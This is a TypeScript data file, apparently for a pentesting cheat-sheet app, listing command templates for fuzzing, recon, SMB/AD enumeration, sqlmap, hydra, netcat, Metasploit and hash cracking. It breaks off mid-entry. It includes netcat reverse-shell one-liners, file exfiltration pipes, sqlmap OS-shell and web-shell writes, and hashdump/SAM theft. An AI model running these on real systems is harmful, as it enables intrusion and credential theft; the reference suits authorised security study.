export interface Command {
  label: string
  cmd: string
}

export interface Category {
  name: string
  commands: Command[]
}

export interface Tool {
  id: string
  name: string
  tags: string[]
  description: string
  categories: Category[]
}

export const tools: Tool[] = [
  // ─── FUZZING ────────────────────────────────────────────────────
  {
    id: 'ffuf',
    name: 'ffuf',
    tags: ['fuzzing', 'web', 'directory', 'enumeration'],
    description: 'Fast web fuzzer written in Go',
    categories: [
      {
        name: 'Directory Enumeration',
        commands: [
          { label: 'Basic scan', cmd: 'ffuf -u https://TARGET/FUZZ -w /usr/share/wordlists/dirb/common.txt' },
          { label: 'With extensions', cmd: 'ffuf -u https://TARGET/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.js,.txt' },
          { label: 'Filter by status', cmd: 'ffuf -u https://TARGET/FUZZ -w wordlist.txt -fc 404,403' },
          { label: 'Recursive', cmd: 'ffuf -u https://TARGET/FUZZ -w wordlist.txt -recursion -recursion-depth 2' },
          { label: 'With threads', cmd: 'ffuf -u https://TARGET/FUZZ -w wordlist.txt -t 50 -rate 100' },
        ],
      },
      {
        name: 'Subdomain Fuzzing',
        commands: [
          { label: 'Basic subdomain', cmd: 'ffuf -u http://FUZZ.DOMAIN -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt' },
          { label: 'With Host header', cmd: 'ffuf -u http://TARGET -H "Host: FUZZ.DOMAIN" -w subdomains.txt -fc 302' },
        ],
      },
      {
        name: 'VHost Fuzzing',
        commands: [
          { label: 'VHost discovery', cmd: 'ffuf -u http://TARGET -H "Host: FUZZ.DOMAIN" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs SIZE' },
        ],
      },
      {
        name: 'Parameter Fuzzing',
        commands: [
          { label: 'GET param fuzz', cmd: 'ffuf -u "https://TARGET/page?FUZZ=value" -w params.txt' },
          { label: 'GET value fuzz', cmd: 'ffuf -u "https://TARGET/page?id=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt' },
          { label: 'POST body fuzz', cmd: 'ffuf -u https://TARGET/login -X POST -d "username=FUZZ&password=test" -w usernames.txt -H "Content-Type: application/x-www-form-urlencoded"' },
        ],
      },
      {
        name: 'Auth Bypass',
        commands: [
          { label: 'Login brute', cmd: 'ffuf -u https://TARGET/login -X POST -d "user=admin&pass=FUZZ" -w /usr/share/wordlists/rockyou.txt -H "Content-Type: application/x-www-form-urlencoded" -fc 200 -fs SIZE' },
        ],
      },
    ],
  },
  {
    id: 'gobuster',
    name: 'gobuster',
    tags: ['fuzzing', 'web', 'directory', 'dns', 'enumeration'],
    description: 'Directory/file, DNS and VHost busting tool',
    categories: [
      {
        name: 'Directory/File Mode',
        commands: [
          { label: 'Basic dir scan', cmd: 'gobuster dir -u https://TARGET -w /usr/share/wordlists/dirb/common.txt' },
          { label: 'With extensions', cmd: 'gobuster dir -u https://TARGET -w /usr/share/wordlists/dirb/common.txt -x php,html,js,txt' },
          { label: 'With auth', cmd: 'gobuster dir -u https://TARGET -w wordlist.txt -U admin -P password' },
          { label: 'Ignore SSL', cmd: 'gobuster dir -u https://TARGET -w wordlist.txt -k' },
          { label: 'Custom status codes', cmd: 'gobuster dir -u https://TARGET -w wordlist.txt -s 200,301,302' },
        ],
      },
      {
        name: 'DNS Mode',
        commands: [
          { label: 'Subdomain enum', cmd: 'gobuster dns -d DOMAIN -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt' },
          { label: 'Show IPs', cmd: 'gobuster dns -d DOMAIN -w subdomains.txt -i' },
          { label: 'With resolver', cmd: 'gobuster dns -d DOMAIN -w subdomains.txt -r 8.8.8.8' },
        ],
      },
      {
        name: 'VHost Mode',
        commands: [
          { label: 'VHost discovery', cmd: 'gobuster vhost -u http://TARGET -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt' },
        ],
      },
    ],
  },
  {
    id: 'wfuzz',
    name: 'wfuzz',
    tags: ['fuzzing', 'web', 'brute force', 'enumeration'],
    description: 'Web application fuzzer',
    categories: [
      {
        name: 'Web Fuzzing',
        commands: [
          { label: 'Basic fuzz', cmd: 'wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404 https://TARGET/FUZZ' },
          { label: 'With extensions', cmd: 'wfuzz -c -w wordlist.txt --hc 404 -z list,php-html-js https://TARGET/FUZZ.FUZ2Z' },
          { label: 'Filter by size', cmd: 'wfuzz -c -w wordlist.txt --hc 404 --hs "Not Found" https://TARGET/FUZZ' },
        ],
      },
      {
        name: 'Parameter Brute',
        commands: [
          { label: 'GET params', cmd: 'wfuzz -c -w params.txt --hc 404 "https://TARGET/page?FUZZ=value"' },
          { label: 'POST brute', cmd: 'wfuzz -c -w passwords.txt --hc 403 -d "user=admin&pass=FUZZ" https://TARGET/login' },
        ],
      },
      {
        name: 'Auth Brute',
        commands: [
          { label: 'HTTP basic auth', cmd: 'wfuzz -c -w users.txt -z file,passwords.txt --hc 401 --basic "FUZZ:FUZ2Z" https://TARGET' },
          { label: 'Cookie fuzz', cmd: 'wfuzz -c -w sessions.txt --hc 403 -b "session=FUZZ" https://TARGET/admin' },
        ],
      },
    ],
  },
  {
    id: 'feroxbuster',
    name: 'feroxbuster',
    tags: ['fuzzing', 'web', 'directory', 'recursive', 'enumeration'],
    description: 'Fast, recursive content discovery tool',
    categories: [
      {
        name: 'Directory Busting',
        commands: [
          { label: 'Basic scan', cmd: 'feroxbuster -u https://TARGET -w /usr/share/wordlists/dirb/common.txt' },
          { label: 'Recursive with extensions', cmd: 'feroxbuster -u https://TARGET -w wordlist.txt -x php,html,js --depth 3' },
          { label: 'Filter size', cmd: 'feroxbuster -u https://TARGET -w wordlist.txt --filter-size SIZE' },
          { label: 'With threads', cmd: 'feroxbuster -u https://TARGET -w wordlist.txt -t 50' },
          { label: 'Silent/output', cmd: 'feroxbuster -u https://TARGET -w wordlist.txt -o results.txt --quiet' },
        ],
      },
      {
        name: 'Advanced Options',
        commands: [
          { label: 'Resume scan', cmd: 'feroxbuster --resume-from ferox-TARGET.state' },
          { label: 'Proxy through Burp', cmd: 'feroxbuster -u https://TARGET -w wordlist.txt --proxy http://127.0.0.1:8080 -k' },
          { label: 'With cookies', cmd: 'feroxbuster -u https://TARGET -w wordlist.txt -b "session=SESSIONID"' },
        ],
      },
    ],
  },
  {
    id: 'dirsearch',
    name: 'dirsearch',
    tags: ['fuzzing', 'web', 'directory', 'enumeration'],
    description: 'Web path scanner',
    categories: [
      {
        name: 'Directory Scan',
        commands: [
          { label: 'Basic scan', cmd: 'dirsearch -u https://TARGET' },
          { label: 'Custom wordlist', cmd: 'dirsearch -u https://TARGET -w /usr/share/wordlists/dirb/common.txt' },
          { label: 'With extensions', cmd: 'dirsearch -u https://TARGET -e php,html,js,txt,xml' },
          { label: 'Exclude status', cmd: 'dirsearch -u https://TARGET -x 404,403,500' },
        ],
      },
      {
        name: 'Output & Reports',
        commands: [
          { label: 'Save to file', cmd: 'dirsearch -u https://TARGET -o results.txt --format plain' },
          { label: 'JSON report', cmd: 'dirsearch -u https://TARGET -o results.json --format json' },
        ],
      },
    ],
  },

  // ─── RECONNAISSANCE ────────────────────────────────────────────
  {
    id: 'nmap',
    name: 'nmap',
    tags: ['recon', 'network', 'port scan', 'enumeration'],
    description: 'Network exploration and security auditing tool',
    categories: [
      {
        name: 'Basic Scanning',
        commands: [
          { label: 'Quick scan', cmd: 'nmap -sV IP' },
          { label: 'Full port scan', cmd: 'nmap -p- IP' },
          { label: 'Top 1000 ports', cmd: 'nmap --top-ports 1000 IP' },
          { label: 'Multiple targets', cmd: 'nmap IP1 IP2 CIDR/24' },
          { label: 'From file', cmd: 'nmap -iL targets.txt' },
        ],
      },
      {
        name: 'Service & OS Detection',
        commands: [
          { label: 'Service version', cmd: 'nmap -sV IP' },
          { label: 'OS detection', cmd: 'nmap -O IP' },
          { label: 'Aggressive scan', cmd: 'nmap -A IP' },
          { label: 'Version intensity', cmd: 'nmap -sV --version-intensity 9 IP' },
        ],
      },
      {
        name: 'Stealth Scanning',
        commands: [
          { label: 'SYN stealth', cmd: 'nmap -sS IP' },
          { label: 'ACK scan', cmd: 'nmap -sA IP' },
          { label: 'FIN scan', cmd: 'nmap -sF IP' },
          { label: 'Idle scan', cmd: 'nmap -sI ZOMBIE_IP IP' },
          { label: 'Decoy scan', cmd: 'nmap -D RND:10 IP' },
        ],
      },
      {
        name: 'Script Scanning (NSE)',
        commands: [
          { label: 'Default scripts', cmd: 'nmap -sC IP' },
          { label: 'Vuln scripts', cmd: 'nmap --script vuln IP' },
          { label: 'SMB scripts', cmd: 'nmap --script smb-enum-shares,smb-enum-users -p 445 IP' },
          { label: 'HTTP scripts', cmd: 'nmap --script http-enum,http-title -p 80,443 IP' },
          { label: 'All scripts', cmd: 'nmap -sC -sV --script all IP' },
        ],
      },
      {
        name: 'UDP Scanning',
        commands: [
          { label: 'UDP scan', cmd: 'nmap -sU IP' },
          { label: 'Top UDP ports', cmd: 'nmap -sU --top-ports 100 IP' },
          { label: 'UDP + TCP', cmd: 'nmap -sU -sS IP' },
        ],
      },
      {
        name: 'Output Formats',
        commands: [
          { label: 'Normal output', cmd: 'nmap -oN scan.txt IP' },
          { label: 'XML output', cmd: 'nmap -oX scan.xml IP' },
          { label: 'All formats', cmd: 'nmap -oA scan IP' },
          { label: 'Grep-able', cmd: 'nmap -oG scan.gnmap IP' },
        ],
      },
    ],
  },
  {
    id: 'masscan',
    name: 'masscan',
    tags: ['recon', 'network', 'port scan'],
    description: 'Mass IP port scanner — fastest in the world',
    categories: [
      {
        name: 'Port Scanning',
        commands: [
          { label: 'All ports fast', cmd: 'masscan IP -p0-65535 --rate=1000' },
          { label: 'Specific ports', cmd: 'masscan CIDR/24 -p80,443,8080,8443 --rate=5000' },
          { label: 'Full internet', cmd: 'masscan 0.0.0.0/0 -p80 --rate=100000 --exclude 255.255.255.255' },
          { label: 'Banner grabbing', cmd: 'masscan IP -p80,443 --rate=1000 --banners' },
          { label: 'Save results', cmd: 'masscan IP -p0-65535 --rate=1000 -oX results.xml' },
        ],
      },
    ],
  },
  {
    id: 'theHarvester',
    name: 'theHarvester',
    tags: ['recon', 'osint', 'email', 'subdomain'],
    description: 'Email, subdomain and DNS OSINT gathering',
    categories: [
      {
        name: 'Email Recon',
        commands: [
          { label: 'Bing email', cmd: 'theHarvester -d DOMAIN -b bing' },
          { label: 'Google email', cmd: 'theHarvester -d DOMAIN -b google' },
          { label: 'All sources', cmd: 'theHarvester -d DOMAIN -b all' },
          { label: 'Limit results', cmd: 'theHarvester -d DOMAIN -b google -l 500' },
        ],
      },
      {
        name: 'Subdomain Recon',
        commands: [
          { label: 'DNS brute', cmd: 'theHarvester -d DOMAIN -b dnsdumpster' },
          { label: 'Shodan', cmd: 'theHarvester -d DOMAIN -b shodan' },
          { label: 'Multiple sources', cmd: 'theHarvester -d DOMAIN -b bing,google,dnsdumpster,shodan' },
        ],
      },
      {
        name: 'Output',
        commands: [
          { label: 'HTML report', cmd: 'theHarvester -d DOMAIN -b all -f report.html' },
          { label: 'XML report', cmd: 'theHarvester -d DOMAIN -b all -f report.xml' },
        ],
      },
    ],
  },
  {
    id: 'amass',
    name: 'amass',
    tags: ['recon', 'subdomain', 'osint', 'dns'],
    description: 'In-depth attack surface mapping and asset discovery',
    categories: [
      {
        name: 'Passive Enum',
        commands: [
          { label: 'Passive mode', cmd: 'amass enum -passive -d DOMAIN' },
          { label: 'Multiple domains', cmd: 'amass enum -passive -d DOMAIN1,DOMAIN2' },
          { label: 'With config', cmd: 'amass enum -passive -d DOMAIN -config config.ini' },
        ],
      },
      {
        name: 'Active Enum',
        commands: [
          { label: 'Active scan', cmd: 'amass enum -active -d DOMAIN' },
          { label: 'DNS brute', cmd: 'amass enum -brute -d DOMAIN -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt' },
          { label: 'With resolvers', cmd: 'amass enum -active -d DOMAIN -rf resolvers.txt' },
        ],
      },
      {
        name: 'Intel',
        commands: [
          { label: 'Reverse whois', cmd: 'amass intel -d DOMAIN -whois' },
          { label: 'ASN lookup', cmd: 'amass intel -asn ASN_NUMBER' },
          { label: 'CIDR discovery', cmd: 'amass intel -cidr CIDR/24' },
        ],
      },
    ],
  },
  {
    id: 'subfinder',
    name: 'subfinder',
    tags: ['recon', 'subdomain', 'osint'],
    description: 'Fast passive subdomain enumeration tool',
    categories: [
      {
        name: 'Subdomain Discovery',
        commands: [
          { label: 'Basic scan', cmd: 'subfinder -d DOMAIN' },
          { label: 'All sources', cmd: 'subfinder -d DOMAIN -all' },
          { label: 'Multiple domains', cmd: 'subfinder -dL domains.txt' },
          { label: 'Silent output', cmd: 'subfinder -d DOMAIN -silent' },
          { label: 'Save output', cmd: 'subfinder -d DOMAIN -o subdomains.txt' },
        ],
      },
    ],
  },
  {
    id: 'assetfinder',
    name: 'assetfinder',
    tags: ['recon', 'subdomain', 'osint'],
    description: 'Find domains and subdomains related to a target',
    categories: [
      {
        name: 'Asset Discovery',
        commands: [
          { label: 'Find subdomains', cmd: 'assetfinder DOMAIN' },
          { label: 'Subs only', cmd: 'assetfinder --subs-only DOMAIN' },
          { label: 'Save to file', cmd: 'assetfinder --subs-only DOMAIN | tee subdomains.txt' },
          { label: 'Pipe to httprobe', cmd: 'assetfinder --subs-only DOMAIN | httprobe' },
        ],
      },
    ],
  },

  // ─── ENUMERATION ───────────────────────────────────────────────
  {
    id: 'enum4linux',
    name: 'enum4linux',
    tags: ['enumeration', 'smb', 'windows', 'active directory'],
    description: 'SMB/Windows enumeration tool (Linux wrapper around samba)',
    categories: [
      {
        name: 'Full Enumeration',
        commands: [
          { label: 'All enum', cmd: 'enum4linux -a IP' },
          { label: 'With credentials', cmd: 'enum4linux -a -u admin -p password IP' },
          { label: 'Save output', cmd: 'enum4linux -a IP | tee enum.txt' },
        ],
      },
      {
        name: 'Users & Groups',
        commands: [
          { label: 'User list', cmd: 'enum4linux -U IP' },
          { label: 'Group list', cmd: 'enum4linux -G IP' },
          { label: 'RID brute', cmd: 'enum4linux -r IP' },
          { label: 'Machine list', cmd: 'enum4linux -M IP' },
        ],
      },
      {
        name: 'Shares & Policies',
        commands: [
          { label: 'Share list', cmd: 'enum4linux -S IP' },
          { label: 'Password policy', cmd: 'enum4linux -P IP' },
          { label: 'OS info', cmd: 'enum4linux -o IP' },
        ],
      },
    ],
  },
  {
    id: 'smbclient',
    name: 'smbclient',
    tags: ['enumeration', 'smb', 'windows', 'file transfer'],
    description: 'SMB/CIFS client for accessing Windows shares',
    categories: [
      {
        name: 'Share Listing',
        commands: [
          { label: 'List shares (null)', cmd: 'smbclient -L //IP -N' },
          { label: 'List shares (auth)', cmd: 'smbclient -L //IP -U username' },
          { label: 'List with domain', cmd: 'smbclient -L //IP -U DOMAIN\\\\username' },
        ],
      },
      {
        name: 'File Operations',
        commands: [
          { label: 'Connect to share', cmd: 'smbclient //IP/SHARE -N' },
          { label: 'Download file', cmd: 'smbclient //IP/SHARE -N -c "get file.txt"' },
          { label: 'Upload file', cmd: 'smbclient //IP/SHARE -N -c "put shell.php"' },
          { label: 'Recursive download', cmd: 'smbclient //IP/SHARE -N -c "recurse; prompt; mget *"' },
        ],
      },
    ],
  },
  {
    id: 'crackmapexec',
    name: 'crackmapexec',
    tags: ['enumeration', 'exploitation', 'smb', 'windows', 'active directory', 'lateral movement'],
    description: 'Swiss army knife for pentesting Windows/AD environments',
    categories: [
      {
        name: 'SMB Enumeration',
        commands: [
          { label: 'Host enum', cmd: 'crackmapexec smb CIDR/24' },
          { label: 'Null session', cmd: 'crackmapexec smb IP -u "" -p ""' },
          { label: 'Share enum', cmd: 'crackmapexec smb IP -u USER -p PASS --shares' },
          { label: 'User enum', cmd: 'crackmapexec smb IP -u USER -p PASS --users' },
          { label: 'Group enum', cmd: 'crackmapexec smb IP -u USER -p PASS --groups' },
        ],
      },
      {
        name: 'Credential Testing',
        commands: [
          { label: 'Password spray', cmd: 'crackmapexec smb IP -u users.txt -p PASS --continue-on-success' },
          { label: 'Hash spray (PTH)', cmd: 'crackmapexec smb IP -u USER -H NTHASH --local-auth' },
          { label: 'Credential stuffing', cmd: 'crackmapexec smb CIDR/24 -u USER -p PASS' },
        ],
      },
      {
        name: 'WinRM',
        commands: [
          { label: 'WinRM check', cmd: 'crackmapexec winrm IP -u USER -p PASS' },
          { label: 'Execute command', cmd: 'crackmapexec winrm IP -u USER -p PASS -x "whoami"' },
          { label: 'PS command', cmd: 'crackmapexec winrm IP -u USER -p PASS -X "Get-Process"' },
        ],
      },
      {
        name: 'LDAP',
        commands: [
          { label: 'LDAP enum', cmd: 'crackmapexec ldap IP -u USER -p PASS --users' },
          { label: 'Bloodhound', cmd: 'crackmapexec ldap IP -u USER -p PASS --bloodhound --collection All' },
          { label: 'ASREPRoast', cmd: 'crackmapexec ldap IP -u USER -p PASS --asreproast asrep.txt' },
          { label: 'Kerberoast', cmd: 'crackmapexec ldap IP -u USER -p PASS --kerberoasting kerb.txt' },
        ],
      },
    ],
  },
  {
    id: 'nikto',
    name: 'nikto',
    tags: ['enumeration', 'web', 'vulnerability', 'scanning'],
    description: 'Web server vulnerability scanner',
    categories: [
      {
        name: 'Web Scanning',
        commands: [
          { label: 'Basic scan', cmd: 'nikto -h https://TARGET' },
          { label: 'With SSL', cmd: 'nikto -h TARGET -ssl -port 443' },
          { label: 'Custom port', cmd: 'nikto -h IP -port PORT' },
          { label: 'Save HTML report', cmd: 'nikto -h https://TARGET -o report.html -Format htm' },
          { label: 'Through proxy', cmd: 'nikto -h https://TARGET -useproxy http://127.0.0.1:8080' },
          { label: 'Tuning options', cmd: 'nikto -h https://TARGET -Tuning 4' },
        ],
      },
    ],
  },
  {
    id: 'whatweb',
    name: 'whatweb',
    tags: ['enumeration', 'web', 'fingerprint', 'recon'],
    description: 'Web technology fingerprinting tool',
    categories: [
      {
        name: 'Tech Fingerprinting',
        commands: [
          { label: 'Basic scan', cmd: 'whatweb https://TARGET' },
          { label: 'Verbose', cmd: 'whatweb -v https://TARGET' },
          { label: 'Aggressive', cmd: 'whatweb -a 3 https://TARGET' },
          { label: 'Multiple targets', cmd: 'whatweb -i targets.txt' },
          { label: 'Save JSON', cmd: 'whatweb --log-json=output.json https://TARGET' },
        ],
      },
    ],
  },
  {
    id: 'kerbrute',
    name: 'kerbrute',
    tags: ['enumeration', 'active directory', 'kerberos', 'brute force'],
    description: 'Kerberos-based user enumeration and brute force',
    categories: [
      {
        name: 'User Enumeration',
        commands: [
          { label: 'Enumerate users', cmd: 'kerbrute userenum -d DOMAIN users.txt --dc IP' },
          { label: 'Auto wordlist', cmd: 'kerbrute userenum -d DOMAIN /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc IP' },
        ],
      },
      {
        name: 'Password Attacks',
        commands: [
          { label: 'Password spray', cmd: 'kerbrute passwordspray -d DOMAIN users.txt PASSWORD --dc IP' },
          { label: 'Brute force', cmd: 'kerbrute bruteuser -d DOMAIN USER passwords.txt --dc IP' },
          { label: 'Brute force all', cmd: 'kerbrute bruteforce -d DOMAIN combos.txt --dc IP' },
        ],
      },
    ],
  },

  // ─── EXPLOITATION ───────────────────────────────────────────────
  {
    id: 'sqlmap',
    name: 'sqlmap',
    tags: ['exploitation', 'web', 'sql injection', 'database'],
    description: 'Automatic SQL injection and database takeover tool',
    categories: [
      {
        name: 'Basic Testing',
        commands: [
          { label: 'Basic test', cmd: 'sqlmap -u "https://TARGET/page?id=1"' },
          { label: 'POST request', cmd: 'sqlmap -u "https://TARGET/login" --data="user=admin&pass=test"' },
          { label: 'From Burp file', cmd: 'sqlmap -r request.txt' },
          { label: 'Cookie injection', cmd: 'sqlmap -u "https://TARGET/" --cookie="id=1*"' },
        ],
      },
      {
        name: 'Database Dumping',
        commands: [
          { label: 'List databases', cmd: 'sqlmap -u "https://TARGET/page?id=1" --dbs' },
          { label: 'List tables', cmd: 'sqlmap -u "https://TARGET/page?id=1" -D DBNAME --tables' },
          { label: 'Dump columns', cmd: 'sqlmap -u "https://TARGET/page?id=1" -D DBNAME -T TABLE --columns' },
          { label: 'Dump table', cmd: 'sqlmap -u "https://TARGET/page?id=1" -D DBNAME -T TABLE --dump' },
          { label: 'Dump all', cmd: 'sqlmap -u "https://TARGET/page?id=1" --dump-all' },
        ],
      },
      {
        name: 'OS Interaction',
        commands: [
          { label: 'OS shell', cmd: 'sqlmap -u "https://TARGET/page?id=1" --os-shell' },
          { label: 'SQL shell', cmd: 'sqlmap -u "https://TARGET/page?id=1" --sql-shell' },
          { label: 'File read', cmd: 'sqlmap -u "https://TARGET/page?id=1" --file-read="/etc/passwd"' },
          { label: 'File write', cmd: 'sqlmap -u "https://TARGET/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"' },
        ],
      },
      {
        name: 'WAF Bypass',
        commands: [
          { label: 'Random agent', cmd: 'sqlmap -u "https://TARGET/page?id=1" --random-agent' },
          { label: 'Tamper scripts', cmd: 'sqlmap -u "https://TARGET/page?id=1" --tamper=space2comment,between' },
          { label: 'Level/risk', cmd: 'sqlmap -u "https://TARGET/page?id=1" --level=5 --risk=3' },
          { label: 'Tor proxy', cmd: 'sqlmap -u "https://TARGET/page?id=1" --tor --tor-type=SOCKS5' },
        ],
      },
    ],
  },
  {
    id: 'hydra',
    name: 'hydra',
    tags: ['exploitation', 'brute force', 'password', 'network'],
    description: 'Online password cracking tool — supports 50+ protocols',
    categories: [
      {
        name: 'SSH Brute Force',
        commands: [
          { label: 'Single user', cmd: 'hydra -l USER -P /usr/share/wordlists/rockyou.txt IP ssh' },
          { label: 'User list', cmd: 'hydra -L users.txt -P passwords.txt IP ssh' },
          { label: 'Custom port', cmd: 'hydra -l USER -P wordlist.txt -s PORT IP ssh' },
          { label: 'Verbose', cmd: 'hydra -l USER -P wordlist.txt -V IP ssh' },
        ],
      },
      {
        name: 'FTP Brute Force',
        commands: [
          { label: 'FTP brute', cmd: 'hydra -l USER -P /usr/share/wordlists/rockyou.txt IP ftp' },
          { label: 'FTP verbose', cmd: 'hydra -L users.txt -P pass.txt -V IP ftp' },
        ],
      },
      {
        name: 'HTTP Form Brute',
        commands: [
          { label: 'POST form', cmd: 'hydra -l USER -P wordlist.txt TARGET http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"' },
          { label: 'GET form', cmd: 'hydra -l USER -P wordlist.txt TARGET http-get-form "/login?user=^USER^&pass=^PASS^:Invalid"' },
          { label: 'HTTP basic auth', cmd: 'hydra -l USER -P wordlist.txt TARGET http-get /admin' },
        ],
      },
      {
        name: 'Other Protocols',
        commands: [
          { label: 'RDP brute', cmd: 'hydra -l USER -P wordlist.txt IP rdp' },
          { label: 'SMB brute', cmd: 'hydra -l USER -P wordlist.txt IP smb' },
          { label: 'MySQL brute', cmd: 'hydra -l root -P wordlist.txt IP mysql' },
          { label: 'Telnet brute', cmd: 'hydra -l USER -P wordlist.txt IP telnet' },
        ],
      },
    ],
  },
  {
    id: 'netcat',
    name: 'netcat',
    tags: ['exploitation', 'network', 'reverse shell', 'post-exploitation'],
    description: 'TCP/UDP networking Swiss army knife',
    categories: [
      {
        name: 'Reverse Shells',
        commands: [
          { label: 'Listener', cmd: 'nc -lvnp PORT' },
          { label: 'Connect back', cmd: 'nc -e /bin/bash IP PORT' },
          { label: 'Connect back (no -e)', cmd: 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc IP PORT > /tmp/f' },
          { label: 'Windows reverse', cmd: 'nc.exe -e cmd.exe IP PORT' },
        ],
      },
      {
        name: 'Bind Shells',
        commands: [
          { label: 'Bind listener', cmd: 'nc -lvnp PORT -e /bin/bash' },
          { label: 'Connect to bind', cmd: 'nc IP PORT' },
        ],
      },
      {
        name: 'File Transfer',
        commands: [
          { label: 'Receive file', cmd: 'nc -lvnp PORT > received_file' },
          { label: 'Send file', cmd: 'nc IP PORT < file_to_send' },
          { label: 'Directory transfer', cmd: 'tar czf - /dir | nc IP PORT' },
        ],
      },
      {
        name: 'Port Scanning',
        commands: [
          { label: 'Basic port scan', cmd: 'nc -zv IP PORT1-PORT2' },
          { label: 'UDP scan', cmd: 'nc -zuv IP PORT' },
        ],
      },
    ],
  },
  {
    id: 'msfconsole',
    name: 'msfconsole',
    tags: ['exploitation', 'metasploit', 'framework', 'post-exploitation'],
    description: 'Metasploit Framework console — premier exploit framework',
    categories: [
      {
        name: 'Basic Usage',
        commands: [
          { label: 'Start', cmd: 'msfconsole' },
          { label: 'Search exploit', cmd: 'search type:exploit name:eternalblue' },
          { label: 'Search CVE', cmd: 'search cve:2021-44228' },
          { label: 'Use module', cmd: 'use exploit/windows/smb/ms17_010_eternalblue' },
          { label: 'Show options', cmd: 'show options' },
          { label: 'Show payloads', cmd: 'show payloads' },
        ],
      },
      {
        name: 'Exploit Setup',
        commands: [
          { label: 'Set target', cmd: 'set RHOSTS IP' },
          { label: 'Set port', cmd: 'set RPORT PORT' },
          { label: 'Set payload', cmd: 'set payload windows/x64/meterpreter/reverse_tcp' },
          { label: 'Set LHOST', cmd: 'set LHOST YOUR_IP' },
          { label: 'Run exploit', cmd: 'exploit' },
          { label: 'Run background', cmd: 'exploit -j' },
        ],
      },
      {
        name: 'Meterpreter',
        commands: [
          { label: 'System info', cmd: 'sysinfo' },
          { label: 'Get shell', cmd: 'shell' },
          { label: 'Upload file', cmd: 'upload /local/file C:\\\\Windows\\\\Temp\\\\file' },
          { label: 'Download file', cmd: 'download C:\\\\Windows\\\\SAM /tmp/SAM' },
          { label: 'Migrate process', cmd: 'migrate PID' },
          { label: 'Hashdump', cmd: 'hashdump' },
        ],
      },
    ],
  },

  // ─── PASSWORD / HASH ───────────────────────────────────────────
  {
    id: 'john',
    name: 'john',
    tags: ['password', 'hash', 'cracking'],
    description: 'John the Ripper — offline password cracker',
    categories: [
      {
        name: 'Hash Cracking',
        commands: [
          { label: 'Auto detect & crack', cmd: 'john hashes.txt' },
          { label: 'With wordlist', cmd: 'john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt' },
          { label: 'With rules', cmd: 'john --wordlist=wordlist.txt --rules hashes.txt' },
          { label: 'Incremental', cmd: 'john --incremental hashes.txt' },
          { label: 'Show cracked', cmd: 'john --show hashes.txt' },
        ],
      },
      {
        name: 'Specific Formats',
        commands: [
          { label: 'NTLM hashes', cmd: 'john --format=NT --wordlist=wordlist.txt hashes.txt' },
          { label: 'SHA512 crypt', cmd: 'john --format=sha512crypt --wordlist=wordlist.txt hashes.txt' },
          { label: 'bcrypt', cmd: 'john --format=bcrypt --wordlist=wordlist.txt hashes.txt' },
          { label: 'List formats', cmd: 'john --list=formats' },
        ],
      },
      {
        name: 'File Cracking',
        commands: [
          { label: 'ZIP crack', cmd: 'zip2john file.zip > zip.hash && john zip.hash' },
          { label: 'PDF crack', cmd: 'pdf2john file.pdf > pdf.hash && john pdf.hash' },
          { label: 'SSH key crack', cmd: 'ssh2john id_rsa > id_rsa.hash && john id_rsa.hash' },
          { label: 'KeePass crack', cmd: 'keepass2john db.kdbx > keepass.hash && john keepass.hash' },
        ],
      },
    ],
  },
  {
    id: 'hashcat',
    name: 'hashcat',
    tags: ['password', 'hash', 'cracking', 'gpu'],
    description: 'World\'s fastest GPU-accelerated password cracker',
    categories: [
      {
        name: 'Hash Cracking Modes',
        commands: [
          { label: 'Straight (wordlist)', cmd: 'hashcat -m HASHMODE -a 0 hashes.txt /usr/share/wordlists/rockyou.txt' },
          { label: 'Combination', cmd: 'hashcat -m HASHMODE -a 1 hashes.txt wordlist1.txt wordlist2.txt' },
          { label: 'Brute force mask', cmd: 'hashcat -m HASHMODE -a 3 hashes.txt ?u?l?l?l?d?d?d' },
          { label: 'Rule-based', cmd: 'hashcat -m HASHMODE -a 0 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule' },
          { label: 'Show cracked', cmd: 'hashcat -m HASHMODE hashes.txt --show' },
        ],
      },
      {
        name: 'Common Hash Modes',
        commands: [
          { label: 'MD5 (0)', cmd: 'hashcat -m 0 -a 0 hashes.txt rockyou.txt' },
          { label: 'SHA1 (100)', cmd: 'hashcat -m 100 -a 0 hashes.txt rockyou.txt' },
          { label: 'SHA256 (1400)', cmd: 'hashcat -m 1400 -a 0 hashes.txt rockyou.txt' },
          { label: 'NTLM (1000)', cmd: 'hashcat -m 1000 -a 0 hashes.txt rockyou.txt' },
          { label: 'NetNTLMv2 (5600)', cmd: 'hashcat -m 5600 -a 0 hashes.txt rockyou.txt' },
          { label: 'bcrypt (3200)', cmd: 'hashcat -m 3200 -a 0 hashes.txt rockyou.txt' },
          { label: 'Kerberos 5 (13100)', cmd: 'hashcat -m 13100 -a 0 hashes.txt rockyou.txt' },
          { label: 'WPA2 (22000)', cmd: 'hashcat -m 22000 -a 0 capture.hc22000 rockyou.txt' },
        ],
      },
    ],
  },
  {
    id: 'hashid',
    name: 'hashid',
    tags: ['password', 'hash', 'identification'],
    description: 'Identify hash types',
    categories: [
      {
        name: 'Hash Identification',
        commands: [
          { label: 'Identify hash', cmd: 'hashid HASH' },
          { label: 'From file', cmd: 'hashid -f hashes.txt' },
          { label: 'Show hashcat mode', cmd: 'hashid -m HASH' },
          { label: 'Show john format', cmd: 'hashid -j HASH' },
          { label: 'All modes', cmd: 'hashid -mj HASH' },
        ],
      },
    ],
  },
  {
    id: 'medusa',
    name: 'medusa',
    tags: ['password', 'brute force', 'network'],
    description: 'Speedy parallel network login auditor',
    categories: [
      {
        name: 'Brute Force',
        commands: [
          { label: 'SSH brute', cmd: 'medusa -h IP -u USER -P /usr/share/wordlists/rockyou.txt -M ssh' },
